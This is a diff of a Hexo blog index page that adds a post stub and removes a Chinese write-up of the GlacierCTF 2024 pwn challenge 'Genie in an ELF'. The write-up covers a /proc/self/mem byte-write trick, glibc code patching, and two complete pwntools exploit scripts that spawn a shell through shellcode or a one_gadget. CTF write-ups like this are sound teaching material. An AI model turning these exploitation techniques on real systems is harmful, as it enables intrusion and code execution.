@@ -150,6 +150,72 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/19/Glacierctf-2024/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/12/19/Glacierctf-2024/" class="post-title-link" itemprop="url">Glacierctf-2024</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-12-19 10:08:50 / Modified: 11:56:02" itemprop="dateCreated datePublished" datetime="2024-12-19T10:08:50+08:00">2024-12-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Glacierctf-2024 | Genie in an ELF</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/12/19/Glacierctf-2024/">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/19/qemu_escape/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -264,122 +330,6 @@
             </div>
           <!--/noindex-->
         
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/04/Glacierctf-2024/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/12/04/Glacierctf-2024/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2024-12-04 14:10:15 / Modified: 16:28:36" itemprop="dateCreated datePublished" datetime="2024-12-04T14:10:15+08:00">2024-12-04</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Genie-in-an-ELF"><a href="#Genie-in-an-ELF" class="headerlink" title="Genie in an ELF"></a>Genie in an ELF</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>程序允许在任意地址(包括libc)，并给出了<code>/proc/self/maps</code></p>
-<p>任意写是通过打开两个<code>/proc/self/mem</code>文件来实现的，所以我们甚至能写入只读地址</p>
-<p>但是他是使用<code>fwrite</code>完成的，出于性能原因，glibc并不会立即写入文件，而是将他们缓冲，直到积累了足够的数据</p>
-<p>要想真正写入文件，要么用<code>fflush</code>，要么使用<code>fclose</code>，但是程序既不刷新，也不关闭文件</p>
-<p>但是在程序退出时，<code>exit</code>还是会帮我们处理这些”遗漏”的字节，来写入文件</p>
-<p>会使用所谓的<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.39/C/ident/_IO_cleanup">_IO_cleanup</a> ，然后再到 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.39/C/ident/_IO_flush_all">_IO_flush_all</a>,他会刷新全部文件，然后调用虚表之类的，但本题并没有那么深入</p>
-<p>所以我们写入的字节只能是在</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7f3103e967f8 &lt;_IO_cleanup+40&gt;    call   _IO_flush_all               &lt;_IO_flush_all&gt;</span><br></pre></td></tr></table></figure>
-
-<p>或</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7f3103e961d3 &lt;_IO_flush_all+227&gt;    call   qword ptr [rax + 0x18]      &lt;_IO_file_overflow&gt;</span><br></pre></td></tr></table></figure>
-
-<p>之后，否则写入到前面的并不会执行，最后就完成exit，程序结束</p>
-<h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p>我在仅挨着<code>&lt;_IO_cleanup+40&gt;    call   _IO_flush_all</code>的栈中找到了 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">38:01c0│+150 0x7ffcbb781870 —▸ 0x56156ce53180 ◂— endbr64</span><br></pre></td></tr></table></figure>
-
-<p>距离rsp仅仅为0x1c0,也就是说我们只需要找到一个add rsp，0x1xx     ret即可重新返回到start</p>
-<p>add rsp的gadget并不少见，但我们很难找到一个jmp&#x2F;call来跳转到gadget</p>
-<p>看官方wp是找到一个和gadget的小连接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">87480:       41 83 7d 70 ff          cmp    DWORD PTR [r13+0x70],0xffffffff</span><br><span class="line">87485:       75 ba                   jne    87441 &lt;_IO_proc_open@@GLIBC_2.2.5+0x61&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这是跳转到了<code>_IO_new_proc_open</code>的中间<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/iopopen.c#L144">line 144</a>检测文件是否打开，很幸运，到这里的时候正好可以通过检测，于是可以到87441</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">87441:       31 c0                   xor    eax,eax</span><br><span class="line">87443:       48 8b 55 c8             mov    rdx,QWORD PTR [rbp-0x38]</span><br><span class="line">87447:       64 48 2b 14 25 28 00    sub    rdx,QWORD PTR fs:0x28</span><br><span class="line">8744e:       00 00 </span><br><span class="line">87450:       0f 85 37 04 00 00       jne    8788d &lt;_IO_proc_open@@GLIBC_2.2.5+0x4ad&gt;</span><br><span class="line">87456:       48 81 c4 08 01 00 00    add    rsp,0x108</span><br><span class="line">8745d:       5b                      pop    rbx</span><br><span class="line">8745e:       41 5c                   pop    r12</span><br><span class="line">87460:       41 5d                   pop    r13</span><br><span class="line">87462:       41 5e                   pop    r14</span><br><span class="line">87464:       41 5f                   pop    r15</span><br><span class="line">87466:       5d                      pop    rbp</span><br><span class="line">87467:       c3                      ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这里也能通过检测，于是就到了add rsp ；ret</p>
-<p>而低位为80的跳转也是能找到的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9696e:       0f 85 0c ff ff ff       jne    96880 &lt;_IO_flush_all_linebuffered@@GLIBC_2.2.5+0x440&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这样一来，只需更改0cff为0c0b即可跳转到87480</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ff443a9696e &lt;_IO_cleanup+414&gt;    ✔ jne    _IO_proc_open+160           &lt;_IO_proc_open+160&gt;</span><br></pre></td></tr></table></figure>
-
-<p>此时start距rsp仍是0x1c0，只需修改为add rsp，0x190即可</p>
-<p>但是二次到达gadget时发现，原本0x1c0的start不见了，取而代之的是0x1e8的start+25</p>
-<p>于是再次修改</p>
-<p>再往后的每次都需要修改start+25为start，栈地址也是每次-0x10，但我们还剩下一字节任意写，足够我们来构造shellcode了</p>
-<p>shellcode准备从0x11A5覆写，这一段可执行，也不会在写shellcode中运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwncli import *</span><br><span class="line">from pwn import *</span><br><span class="line">from math import *</span><br><span class="line"></span><br><span class="line">cli_script()  # 使用脚本模式必须显式调用这个函数</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line"># 你能够从gift里面取到很多东西</span><br><span class="line">io = gift[&quot;io&quot;]  # process或remote对象</span><br><span class="line">elf = gift[&quot;elf&quot;]  # ELF对象，ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = gift.libc  # ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">rop = gift.rop  # ROP对象</span><br><span class="line"></span><br><span class="line">filename = gift.filename  # current filename</span><br><span class="line">is_debug = gift.debug  # is debug or not</span><br><span class="line">is_remote = gift.remote  # is remote or not</span><br><span class="line">gdb_pid = gift.gdb_pid  # gdb pid if debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uu64 = lambda: u64(ru(&quot;\x7f&quot;).ljust(8, b&quot;\x00&quot;))</span><br><span class="line"># ra = lambda: r.recvall(timeout=1)</span><br><span class="line"></span><br><span class="line"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br><span class="line">if gift.remote:</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    gift[&quot;libc&quot;] = libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 搜索gadget</span><br><span class="line">ROPgadget_box = RopgadgetBox()</span><br><span class="line">CG.set_find_area(find_in_libc=True, find_in_elf=False)</span><br><span class="line">ru(&quot;begin:\n\n&quot;)</span><br><span class="line">pie = int(r(12), 16)</span><br><span class="line">ru(&quot;heap]\n&quot;)</span><br><span class="line">libc.address = int(r(12), 16)</span><br><span class="line">log_address_ex(&quot;pie&quot;)</span><br><span class="line">log_libc_base_addr(libc.address)</span><br><span class="line">IO_UNBUFFER_ALL_OFFSET = 0x96971</span><br><span class="line">IO_PROC_OPEN_ADD_RSP_OFFSET = 0x87459</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_byte(io: tube, addr: int, data: int):</span><br><span class="line">    assert data &gt;= 0 and data &lt;= 255</span><br><span class="line">    io.sendlineafter(b&quot;What address do you desire for your&quot;, hex(addr).encode())</span><br><span class="line">    io.sendlineafter(b&quot;And what byte do you wish here?\n&quot;, hex(data).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_byte(io, libc.address + IO_PROC_OPEN_ADD_RSP_OFFSET, 0x90)</span><br><span class="line">write_byte(io, libc.address + IO_UNBUFFER_ALL_OFFSET, 0x0B)</span><br><span class="line"># 改_IO_cleanup+414跳转到_IO_PROC_OPEN,也就是控制rsp并ret的地方</span><br><span class="line"># 成功后每次只需要改add rsp即可再回到start,还剩一字节任意写</span><br><span class="line">ru(&quot;My card deck stacks 0x&quot;)</span><br><span class="line">stack = int(r(12), 16)</span><br><span class="line">write_byte(io, stack + 360, 0x80)</span><br><span class="line">write_byte(io, libc.address + IO_PROC_OPEN_ADD_RSP_OFFSET, 0xB8)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = asm(</span><br><span class="line">    f&quot;&quot;&quot;</span><br><span class="line">        mov rdi,&#123;next(libc.search(b&quot;/bin/sh&quot;))&#125;</span><br><span class="line">        mov rax,&#123;libc.symbols[&quot;system&quot;]&#125;</span><br><span class="line">        call rax</span><br><span class="line">                &quot;&quot;&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">info(hexdump(code))</span><br><span class="line">shell_addr = pie + 0x11A5</span><br><span class="line">for i in range(len(code)):</span><br><span class="line">    info(f&quot; - &#123;i&#125; / &#123;len(code)&#125;&quot;)</span><br><span class="line">    stack -= 0x10</span><br><span class="line">    write_byte(io, shell_addr + i, code[i])</span><br><span class="line">    write_byte(io, stack + 360, 0x80)</span><br><span class="line"></span><br><span class="line">write_byte(io, 0, 0)</span><br><span class="line">write_byte(io, 0, 0)</span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>还有一种很简单的方法</p>
-<p>jmp&#x2F;call one_gadget</p>
-<p>我们从libc中获取到4个one_gadget &#x3D; [0x583DC, 0x583E3, 0xEF4CE, 0xEF52B]</p>
-<p>按程序流程一直走一遍，当jmp&#x2F;call的地址首位或后两位与gadget相同时即可</p>
-<p>最终在0x472a1处发现   47a21:        e8 da 67 0a 00           call   0xee200                         </p>
-<p>在gdb中来计算如何变成call 0xef52b</p>
-<p>首先最低位计算</p>
-<p>0x2b-00&#x3D;0x2b</p>
-<p>pwndbg&gt; p&#x2F;x 0xda+0x2b<br>$1 &#x3D; 0x105</p>
-<p>进位1，0x67变为0x68，00xda变为0x05</p>
-<p>次低位计算</p>
-<p>0xf5-0xe2&#x3D;0x13</p>
-<p>pwndbg&gt; p&#x2F;x 0x68+0x13<br>$2 &#x3D; 0x7b</p>
-<p>最终得到结果为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; !disasm -c amd64 -c little -a 0x47a21 e8 057b0a00                                       </span><br><span class="line">   47a21:        e8 05 7b 0a 00           call   0xef52b  </span><br></pre></td></tr></table></figure>
-
-<p>即修改0x47a21+1&#x3D;05,0x47a21+2&#x3D;7b即可</p>
-<p>这个比官方wp简单多了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwncli import *</span><br><span class="line">from pwn import *</span><br><span class="line">from math import *</span><br><span class="line"></span><br><span class="line">cli_script()  # 使用脚本模式必须显式调用这个函数</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line"># 你能够从gift里面取到很多东西</span><br><span class="line">io = gift[&quot;io&quot;]  # process或remote对象</span><br><span class="line">elf = gift[&quot;elf&quot;]  # ELF对象，ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = gift.libc  # ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">rop = gift.rop  # ROP对象</span><br><span class="line"></span><br><span class="line">filename = gift.filename  # current filename</span><br><span class="line">is_debug = gift.debug  # is debug or not</span><br><span class="line">is_remote = gift.remote  # is remote or not</span><br><span class="line">gdb_pid = gift.gdb_pid  # gdb pid if debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uu64 = lambda: u64(ru(&quot;\x7f&quot;).ljust(8, b&quot;\x00&quot;))</span><br><span class="line"># ra = lambda: r.recvall(timeout=1)</span><br><span class="line"></span><br><span class="line"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br><span class="line">if gift.remote:</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    gift[&quot;libc&quot;] = libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 搜索gadget</span><br><span class="line">ROPgadget_box = RopgadgetBox()</span><br><span class="line">CG.set_find_area(find_in_libc=True, find_in_elf=False)</span><br><span class="line">ru(&quot;begin:\n\n&quot;)</span><br><span class="line">pie = int(r(12), 16)</span><br><span class="line">ru(&quot;heap]\n&quot;)</span><br><span class="line">libc.address = int(r(12), 16)</span><br><span class="line">log_address_ex(&quot;pie&quot;)</span><br><span class="line">log_libc_base_addr(libc.address)</span><br><span class="line">IO_UNBUFFER_ALL_OFFSET = 0x96971</span><br><span class="line">IO_PROC_OPEN_ADD_RSP_OFFSET = 0x87459</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_byte(io: tube, addr: int, data: int):</span><br><span class="line">    assert data &gt;= 0 and data &lt;= 255</span><br><span class="line">    io.sendlineafter(b&quot;What address do you desire for your&quot;, hex(addr).encode())</span><br><span class="line">    io.sendlineafter(b&quot;And what byte do you wish here?\n&quot;, hex(data).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_byte(io, libc.address + 0x47A22, 0x05)</span><br><span class="line">write_byte(io, libc.address + 0x47A23, 0x7B)</span><br><span class="line">ia()</span><br><span class="line">one_gadget = [0x583DC, 0x583E3, 0xEF4CE, 0xEF52B]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
       
     </div>
 
